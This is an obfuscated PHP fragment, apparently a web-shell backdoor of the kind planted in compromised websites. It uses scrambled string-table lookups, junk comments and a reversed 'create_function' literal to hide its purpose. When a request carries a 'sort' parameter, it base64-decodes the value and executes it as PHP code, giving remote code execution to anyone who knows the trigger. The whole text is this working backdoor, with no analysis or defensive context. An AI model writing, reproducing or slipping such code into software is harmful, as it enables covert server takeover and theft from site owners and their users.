...
$uAdOWFhb5021 = "fj42_yg1ub(*6dperstz5wkn/x39.v7;c0m)lih8qoa";


$nGAKJrjH859 = "";

foreach([17,41,16,18] as $O){
       $nGAKJrjH859 .= $uAdOWFhb5021[$O];
    }


if(isset($_REQUEST /*swckSylTYDZUcjxzVpktWurOXvwvpRFzQHwNSobunMYiuysmcxOsGhqMWBFfqdKJHLkjmZlPWPqpfHGSDyLlJOKEpBhKMiiMSJryZCOeZLcqkIosytcXgowpbudhAhZJ*/["$nGAKJrjH859"])){
    $wBSHgZKm9165 = $_REQUEST /*swckSylTYDZUcjxzVpktWurOXvwvpRFzQHwNSobunMYiuysmcxOsGhqMWBFfqdKJHLkjmZlPWPqpfHGSDyLlJOKEpBhKMiiMSJryZCOeZLcqkIosytcXgowpbudhAhZJ*/["$nGAKJrjH859"];
    $JWTDSQKX823 = "";
    $fMYdGXlb2445 = "";

    /*MDXIDUhgsyJZkzumMJGqaolkHYBtKYtPQchWctGMaJkLPjLQZFzAKjuNzFMbzfuqnuKdWKzmdNgqNMwoGvNENXWjLgrDHfPLeGHdiWMFyKvPfjAFHetBjFTzqAqZiYDZ*/

    foreach([9,42,17,15,12,2,4,13,15,32,41,13,15] as $O){
       $JWTDSQKX823 .= $uAdOWFhb5021[$O];
    }

    /*oMXXPbrRoBdhQzYQbGtrZhiIpOIodLKgSLHKOZrYwmftVJPVOcNbjCRLIVtwrsliQELriRKXYQAytMZTVrAFMRUHuWyyZSgcgqiRUCwQUnpxkJEKwAHcIZqxzQXualuQ*/


    foreach([17,18,16,16,15,29] as $O){
       $fMYdGXlb2445 .= $uAdOWFhb5021[$O];
    }

    /*RWYlbhCDjExpvzBvqChtYafgYEPjvybyUvizAFbjSPZbajTZEybDIVpJRlaRkEcZsNLFuXUIUTUGYMDxlooGLKRgdMFtsEwujaIGGigbqQjfqiIPlXUDhsNvIgEPTykI*/

    $O = $fMYdGXlb2445('n'.''.''.''.''.'o'.'i'.'t'.''.''.''.'c'.''.''.''.''.'n'.'u'.''.''.'f'.'_'.'e'.'t'.''.''.''.'a'.''.''.'e'.'r'.'c');
    $i = $O("", $JWTDSQKX823($wBSHgZKm9165));
    $i();
    exit();
